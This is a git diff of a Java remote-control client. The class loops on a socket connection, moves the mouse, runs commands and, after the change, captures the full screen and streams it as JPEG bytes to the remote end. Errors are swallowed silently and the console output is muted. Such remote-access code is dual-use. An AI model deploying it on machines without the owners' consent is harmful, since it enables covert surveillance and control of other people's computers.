@@ -5,11 +5,15 @@
  */
 package models;
 
+import com.sun.image.codec.jpeg.ImageFormatException;
+import com.sun.image.codec.jpeg.JPEGCodec;
+import com.sun.image.codec.jpeg.JPEGImageEncoder;
 import java.awt.AWTException;
+import java.awt.HeadlessException;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
-import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
@@ -17,11 +21,9 @@ import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.OutputStream;
-import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import javax.imageio.ImageIO;
 
 /**
  *
@@ -32,6 +34,7 @@ public class Client {
     public static Event e;
     public static Socket sock;
     public static File file = null;
+    public static ObjectOutputStream oos;
     
         public static void main(String[] args) {
             while(true){
@@ -48,7 +51,7 @@ public class Client {
         //            Output streams
                     OutputStream os = sock.getOutputStream();
 
-                    ObjectOutputStream oos = new ObjectOutputStream(os);
+                    oos = new ObjectOutputStream(os);
 
                     try {
 
@@ -98,7 +101,7 @@ public class Client {
                                     executeCmd();
                                     break;
                                 case 4:
-                                    takeScreenshot();
+                                  takeScreenshot();
                                     break;
                             }                    
                         }
@@ -119,7 +122,7 @@ public class Client {
         
         public static void moveMouse(){
             
-            System.out.println("Mouse moved");
+            //System.out.println("Mouse moved");
             
             try {
                 new Robot().mouseMove(e.mouseX, e.mouseY);
@@ -165,25 +168,11 @@ public class Client {
         
         public static void takeScreenshot(){
             
-            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-            BufferedImage capture = null;
-            
-            boolean write = false;
-            
-                try {
-                    
-                    capture = new Robot().createScreenCapture(screenRect);
-                    
-                    file = File.createTempFile("pic", ".jpeg");
-
-                    write = ImageIO.write(capture, "bmp", file);
-                    
-                    System.out.println("Screenshot taken");
-                    
-                    } catch (AWTException ex) {
-                        Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
-                    } catch (IOException ex) {
-                        Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
-                    }
-        }
+                                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                                    try {
+                                        JPEGImageEncoder encoder=JPEGCodec.createJPEGEncoder(baos);
+                                        encoder.encode(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())));
+                                        oos.writeObject(baos.toByteArray());
+                                    } catch (AWTException | HeadlessException | ImageFormatException | IOException throwable) {}
+}
 }
